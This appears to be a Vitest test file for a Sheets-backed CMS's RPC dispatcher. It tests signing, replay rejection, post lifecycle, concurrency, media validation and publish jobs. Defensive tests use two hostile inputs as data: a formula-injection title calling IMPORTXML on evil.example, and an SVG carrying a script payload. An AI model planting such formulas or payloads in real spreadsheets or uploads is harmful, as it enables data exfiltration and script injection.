import { createHash, createHmac, randomBytes, randomUUID } from 'node:crypto';
import { type RpcEnvelope, type RpcResponse, signEnvelope } from '@zidcms/core';
import vectors from '@zidcms/core/rpc.vectors.json';
import { beforeEach, describe, expect, it } from 'vitest';
import { handleRpc } from './dispatcher';
import { emptyState, type MemoryState, memoryDeps } from './memory';

const SECRET = vectors.secret;
const sign = (m: string) => createHmac('sha256', Buffer.from(SECRET, 'utf8')).update(m, 'utf8').digest('hex');

let state: MemoryState;
let deps: ReturnType<typeof memoryDeps>;
let clock: number;

function envelope(action: string, payload: unknown): RpcEnvelope {
  return {
    v: 1,
    action,
    payload,
    ts: clock,
    nonce: randomBytes(16).toString('base64url'),
    actor: 'admin@example.com',
    requestId: randomUUID(),
  };
}

function rpc<T = any>(action: string, payload: unknown = {}): RpcResponse<T> {
  clock += 1;
  return handleRpc(signEnvelope(envelope(action, payload), sign), deps) as RpcResponse<T>;
}

function ok<T = any>(action: string, payload: unknown = {}): T {
  const res = rpc<T>(action, payload);
  if (!res.ok) throw new Error(`${action} failed: ${res.error.code} ${res.error.message}`);
  return res.data;
}

function err(action: string, payload: unknown = {}) {
  const res = rpc(action, payload);
  if (res.ok) throw new Error(`${action} unexpectedly succeeded`);
  return res.error;
}

beforeEach(() => {
  clock = Date.parse('2026-11-21T10:00:00.000Z');
  state = emptyState({ HMAC_SECRET: SECRET, ENVIRONMENT: 'dev' });
  deps = memoryDeps(state, { now: () => clock });
  ok('system.setup');
});

describe('GAS protocol', () => {
  it('TC-GAS-08 rejected requests leave the sheet unchanged', () => {
    const before = JSON.stringify(state.sheets);
    const e = JSON.stringify(envelope('posts.create', { title: 'x' }));
    const attempts = [
      JSON.stringify({ e, s: '0'.repeat(64) }),
      JSON.stringify({ e: e.replace('"x"', '"y"'), s: sign(e) }),
      signEnvelope({ ...envelope('posts.create', { title: 'x' }), ts: clock - 600_000 }, sign),
      signEnvelope(envelope('posts.dropAll', {}), sign),
      'not json',
    ];
    for (const raw of attempts) expect(handleRpc(raw, deps).ok).toBe(false);
    const replay = signEnvelope(envelope('system.health', {}), sign);
    expect(handleRpc(replay, deps).ok).toBe(true);
    expect(handleRpc(replay, deps)).toMatchObject({ ok: false, error: { code: 'REPLAY_DETECTED' } });
    expect(JSON.stringify(state.sheets)).toBe(before);
  });

  it('fails closed when HMAC_SECRET is missing or short', () => {
    state.props.HMAC_SECRET = 'short';
    expect(rpc('system.health')).toMatchObject({ ok: false, error: { code: 'SIGNATURE_INVALID' } });
  });

  it('TC-SEC-05 error responses never contain stack traces', () => {
    state.sheets.Posts = undefined as never;
    const res = rpc('posts.list');
    expect(res.ok).toBe(false);
    expect(JSON.stringify(res)).not.toMatch(/at \w+ \(|\.ts:\d+/);
  });
});

describe('setup & data integrity', () => {
  it('TC-DATA-06 setup is idempotent', () => {
    const headersBefore = JSON.stringify(Object.fromEntries(Object.entries(state.sheets).map(([k, v]) => [k, v[0]])));
    const second = ok('system.setup');
    expect(second.created_sheets).toEqual([]);
    const headersAfter = JSON.stringify(Object.fromEntries(Object.entries(state.sheets).map(([k, v]) => [k, v[0]])));
    expect(headersAfter).toBe(headersBefore);
    expect(state.sheets.Settings?.length).toBe(1 + 8);
    expect(ok('system.health')).toMatchObject({ environment: 'dev', schema_version: 1, invalid_row_count: 0 });
  });

  it('setup is disabled in prod after the first run', () => {
    state.props.ENVIRONMENT = 'prod';
    expect(err('system.setup').code).toBe('FORBIDDEN');
  });

  it('an interrupted prod setup (Drive folder failed) can be re-run until it completes', () => {
    state = emptyState({ HMAC_SECRET: SECRET, ENVIRONMENT: 'prod' });
    deps = memoryDeps(state, { now: () => clock });
    const ensureFolder = deps.media.ensureFolder.bind(deps.media);
    deps.media.ensureFolder = () => {
      throw new Error('Izin ditolak saat mengaktifkan API: drive');
    };
    expect(err('system.setup').code).toBe('INTERNAL_ERROR');
    deps.media.ensureFolder = ensureFolder;
    expect(ok('system.setup').media_folder_configured).toBe(true);
    expect(ok('system.health')).toMatchObject({ environment: 'prod', media_folder_configured: true });
    expect(err('system.setup').code).toBe('FORBIDDEN');
  });

  it('TC-DATA-02 formula-like values are stored escaped and read back verbatim', () => {
    const post = ok('posts.create', { title: '=IMPORTXML("https://evil.example","//a")', slug: 'formula' });
    const row = state.sheets.Posts?.[1] ?? [];
    expect(row.every((cell) => !/^[=+\-@]/.test(cell))).toBe(true);
    expect(ok('posts.get', { id: post.id }).title).toBe('=IMPORTXML("https://evil.example","//a")');
  });

  it('TC-DATA-05 manually corrupted rows are reported and excluded', () => {
    ok('posts.create', { title: 'Baik' });
    const bad = ok('posts.create', { title: 'Rusak' });
    const headers = state.sheets.Posts?.[0] ?? [];
    const row = state.sheets.Posts?.[2] ?? [];
    row[headers.indexOf('status')] = 'whatever';
    expect(ok('posts.list').items.map((p: { id: string }) => p.id)).not.toContain(bad.id);
    expect(ok('system.health').invalid_rows).toEqual({ Posts: 1 });
  });

  it('TC-DATA-03 Unicode round trip', () => {
    const title = 'Halo 👋 — ünïcödé 日本語';
    const post = ok('posts.create', { title, content_markdown: `# ${title}` });
    expect(ok('posts.get', { id: post.id })).toMatchObject({ title, content_markdown: `# ${title}` });
  });
});

describe('posts lifecycle', () => {
  it('creates with revision + audit and enforces slug uniqueness', () => {
    const post = ok('posts.create', { title: 'Halo Dunia' });
    expect(post).toMatchObject({ slug: 'halo-dunia', status: 'draft', version: 1, created_by: 'admin@example.com' });
    expect(state.sheets.Revisions).toHaveLength(2);
    expect(state.sheets.AuditLog?.some((r) => r.includes('posts.create'))).toBe(true);
    expect(err('posts.create', { title: 'Halo Dunia' }).code).toBe('SLUG_CONFLICT');
    expect(err('posts.create', { title: '' }).code).toBe('VALIDATION_ERROR');
    expect(err('posts.create', { title: 'x', sheet_id: 'abc' }).code).toBe('VALIDATION_ERROR');
  });

  it('TC-CONC-01 parallel updates at the same version: exactly one wins', () => {
    const post = ok('posts.create', { title: 'Konkuren' });
    const results = Array.from({ length: 10 }, (_, i) =>
      rpc('posts.update', { id: post.id, expected_version: 1, patch: { title: `Versi ${i}` } }),
    );
    expect(results.filter((r) => r.ok)).toHaveLength(1);
    const conflicts = results.filter((r) => !r.ok && r.error.code === 'VERSION_CONFLICT');
    expect(conflicts).toHaveLength(9);
    expect(conflicts[0]).toMatchObject({ error: { details: { current_version: 2 } } });
  });

  it('TC-CONC-02 parallel creates with the same slug: exactly one wins', () => {
    const results = Array.from({ length: 5 }, () => rpc('posts.create', { title: 'Sama', slug: 'sama' }));
    expect(results.filter((r) => r.ok)).toHaveLength(1);
  });

  it('TC-CONC-03 lock timeout surfaces LOCK_TIMEOUT', () => {
    deps.lock.forceTimeout = true;
    expect(rpc('posts.create', { title: 'x' })).toMatchObject({
      ok: false,
      error: { code: 'LOCK_TIMEOUT', retryable: true },
    });
  });

  it('status transitions, soft delete and restore (TC-DATA-07)', () => {
    const post = ok('posts.create', { title: 'Status' });
    const published = ok('posts.setStatus', { id: post.id, expected_version: 1, to: 'published' });
    expect(published.publishRequired).toBe(true);
    expect(published.item.published_at).toBe(published.item.updated_at);
    const archived = ok('posts.setStatus', { id: post.id, expected_version: 2, to: 'archived' });
    expect(err('posts.setStatus', { id: post.id, expected_version: 3, to: 'published' }).code).toBe(
      'INVALID_TRANSITION',
    );
    const deleted = ok('posts.softDelete', { id: post.id, expected_version: archived.item.version });
    expect(deleted.publishRequired).toBe(false);
    expect(ok('posts.list').items).toHaveLength(0);
    expect(ok('posts.list', { status: 'trash' }).items).toHaveLength(1);
    ok('posts.create', { title: 'Status' });
    expect(err('posts.restore', { id: post.id, expected_version: deleted.item.version }).code).toBe('SLUG_CONFLICT');
  });

  it('restore returns to draft and lists counts', () => {
    const post = ok('posts.create', { title: 'Hapus' });
    const deleted = ok('posts.softDelete', { id: post.id, expected_version: 1 });
    const restored = ok('posts.restore', { id: post.id, expected_version: deleted.item.version });
    expect(restored.item).toMatchObject({ status: 'draft', deleted_at: null });
    expect(ok('posts.list').counts).toMatchObject({ all: 1, draft: 1, trash: 0 });
    expect(ok('posts.revisions', { id: post.id }).map((r: { version: number }) => r.version)).toEqual([3, 2, 1]);
  });

  it('search, filter and pagination', () => {
    for (let i = 0; i < 25; i++) ok('posts.create', { title: `Artikel ${i}` });
    const first = ok('posts.list', { limit: 10 });
    expect(first.items).toHaveLength(10);
    expect(first.nextCursor).toBe('10');
    expect(first.items[0].content_markdown).toBeUndefined();
    expect(ok('posts.list', { q: 'artikel 2' }).total).toBe(6);
  });

  it('pages reject reserved slugs', () => {
    expect(err('pages.create', { title: 'Blog', slug: 'blog' }).code).toBe('VALIDATION_ERROR');
    expect(ok('pages.create', { title: 'Tentang Kami', nav_order: 1 })).toMatchObject({
      slug: 'tentang-kami',
      nav_order: 1,
    });
  });
});

describe('settings, taxonomy, media', () => {
  it('settings round trip', () => {
    const updated = ok('settings.update', { patch: { site_title: 'Situs Saya', posts_per_page: 5 } });
    expect(updated.settings).toMatchObject({ site_title: 'Situs Saya', posts_per_page: 5 });
    expect(err('settings.update', { patch: { posts_per_page: 99 } }).code).toBe('VALIDATION_ERROR');
  });

  it('taxonomy CRUD', () => {
    const cat = ok('taxonomy.create', { kind: 'category', fields: { name: 'Teknologi' } });
    expect(cat.slug).toBe('teknologi');
    expect(err('taxonomy.create', { kind: 'category', fields: { name: 'Teknologi' } }).code).toBe('SLUG_CONFLICT');
    ok('taxonomy.update', { kind: 'category', id: cat.id, expected_version: 1, patch: { name: 'Tekno' } });
    ok('taxonomy.softDelete', { kind: 'category', id: cat.id, expected_version: 2 });
    expect(ok('taxonomy.list', { kind: 'category' }).items).toHaveLength(0);
  });

  it('TC-SEC-03 media upload enforces type, size, magic bytes and dedupes', () => {
    const png = Buffer.concat([
      Buffer.from([
        0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 13, 0x49, 0x48, 0x44, 0x52, 0, 0, 0, 10, 0, 0, 0, 20,
      ]),
      randomBytes(64),
    ]);
    const payload = {
      filename: 'Gambar Saya.png',
      mime: 'image/png',
      sha256: createHash('sha256').update(png).digest('hex'),
      base64: png.toString('base64'),
      alt_text: 'alt',
    };
    const first = ok('media.upload', payload);
    expect(first.item).toMatchObject({ filename: 'Gambar-Saya.png', width: 10, height: 20 });
    expect(first.deduplicated).toBe(false);
    expect(ok('media.upload', payload).deduplicated).toBe(true);
    const svg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>');
    expect(err('media.upload', { ...payload, mime: 'image/svg+xml' }).code).toBe('UNSUPPORTED_MEDIA_TYPE');
    expect(
      err('media.upload', {
        ...payload,
        base64: svg.toString('base64'),
        sha256: createHash('sha256').update(svg).digest('hex'),
      }).code,
    ).toBe('UNSUPPORTED_MEDIA_TYPE');
    expect(err('media.upload', { ...payload, sha256: 'a'.repeat(64) }).code).toBe('BAD_REQUEST');
    const big = Buffer.concat([png, Buffer.alloc(3 * 1024 * 1024)]);
    expect(
      err('media.upload', {
        ...payload,
        base64: big.toString('base64'),
        sha256: createHash('sha256').update(big).digest('hex'),
      }).code,
    ).toBe('PAYLOAD_TOO_LARGE');
    expect(ok('media.getBytes', { id: first.item.id }).base64).toBe(payload.base64);
    expect(JSON.stringify(ok('media.list'))).not.toContain('drive_file_id');
  });
});

describe('editor.context', () => {
  it('returns everything the editor needs in one call, without Drive ids', () => {
    const post = ok('posts.create', { title: 'Konteks' });
    ok('taxonomy.create', { kind: 'category', fields: { name: 'Berita' } });
    const ctx = ok('editor.context', { kind: 'post', id: post.id });
    expect(ctx.item.id).toBe(post.id);
    expect(ctx.categories).toHaveLength(1);
    expect(ctx.settings.site_title).toBe('ZidCMS Site');
    expect(ctx.live).toBeNull();
    expect(JSON.stringify(ctx)).not.toContain('drive_file_id');
    expect(ok('editor.context', { kind: 'page' })).toMatchObject({ item: null, categories: [], tags: [] });
    expect(err('editor.context', { kind: 'post', id: '11111111-1111-4111-8111-111111111111' }).code).toBe('NOT_FOUND');
  });
});

describe('publish jobs', () => {
  it('TC-PUB-04/05 coalescing and idempotency', () => {
    const a = ok('publish.acquire', { type: 'publish', idempotency_key: 'key-aaaaaaaa' });
    expect(a).toMatchObject({ coalesced: false, job: { state: 'queued' } });
    expect(ok('publish.acquire', { type: 'publish', idempotency_key: 'key-aaaaaaaa' })).toMatchObject({
      existing: true,
      job: { id: a.job.id },
    });
    const b = ok('publish.acquire', { type: 'publish', idempotency_key: 'key-bbbbbbbb' });
    expect(b).toMatchObject({ coalesced: true, job: { id: a.job.id, rerun_requested: true } });
    expect(state.sheets.PublishJobs).toHaveLength(2);
    expect(err('publish.acquire', { type: 'rollback', idempotency_key: 'key-cccccccc', target_version: 1 }).code).toBe(
      'PUBLISH_IN_PROGRESS',
    );
  });

  it('claims steps exclusively, CAS-transitions and creates a follow-up on rerun', () => {
    const { job } = ok('publish.acquire', { type: 'publish', idempotency_key: 'key-dddddddd' });
    ok('publish.acquire', { type: 'publish', idempotency_key: 'key-eeeeeeee' });
    expect(ok('publish.claimStep', { id: job.id, state: 'queued', lease_ms: 60_000 }).claimed).toBe(true);
    expect(ok('publish.claimStep', { id: job.id, state: 'queued', lease_ms: 60_000 }).claimed).toBe(false);
    clock += 61_000;
    expect(ok('publish.claimStep', { id: job.id, state: 'queued' }).job.step_attempts).toBe(2);
    expect(ok('publish.updateJob', { id: job.id, from_state: 'queued', to_state: 'collecting' }).updated).toBe(true);
    expect(ok('publish.updateJob', { id: job.id, from_state: 'queued', to_state: 'collecting' }).updated).toBe(false);
    expect(err('publish.updateJob', { id: job.id, from_state: 'collecting', to_state: 'verifying' }).code).toBe(
      'INVALID_TRANSITION',
    );
    const live = ok('publish.updateJob', {
      id: job.id,
      from_state: 'collecting',
      to_state: 'live',
      fields: { checksum: 'sha256:x' },
    });
    expect(live.job).toMatchObject({ state: 'live', checksum: 'sha256:x' });
    expect(live.job.finished_at).not.toBeNull();
    expect(live.followUp).toMatchObject({ state: 'queued', type: 'publish' });
    expect(ok('publish.listJobs').active.id).toBe(live.followUp.id);
  });

  it('snapshots record, supersede and rollback target validation', () => {
    ok('snapshots.record', { version: 1, checksum: 'sha256:a', git_commit_sha: 'abc', source_job_id: 'j1' });
    expect(
      ok('snapshots.record', { version: 1, checksum: 'sha256:a', git_commit_sha: 'abc', source_job_id: 'j1' }).version,
    ).toBe(1);
    expect(err('snapshots.record', { version: 1, source_job_id: 'j2' }).code).toBe('VERSION_CONFLICT');
    ok('snapshots.setStatus', { version: 1, status: 'live' });
    ok('snapshots.record', { version: 2, checksum: 'sha256:b', git_commit_sha: 'def', source_job_id: 'j3' });
    ok('snapshots.setStatus', { version: 2, status: 'live' });
    const list = ok('snapshots.list');
    expect(list.live.version).toBe(2);
    expect(list.items.find((s: { version: number }) => s.version === 1).status).toBe('superseded');
    expect(
      ok('publish.acquire', { type: 'rollback', idempotency_key: 'key-ffffffff', target_version: 1 }).job,
    ).toMatchObject({
      type: 'rollback',
      target_version: 1,
    });
  });

  it('readPublished returns only published, non-deleted content', () => {
    const a = ok('posts.create', { title: 'Terbit' });
    ok('posts.setStatus', { id: a.id, expected_version: 1, to: 'published' });
    ok('posts.create', { title: 'Draf' });
    const data = ok('publish.readPublished');
    expect(data.posts.map((p: { id: string }) => p.id)).toEqual([a.id]);
    expect(data.settings.site_title).toBe('ZidCMS Site');
  });
});
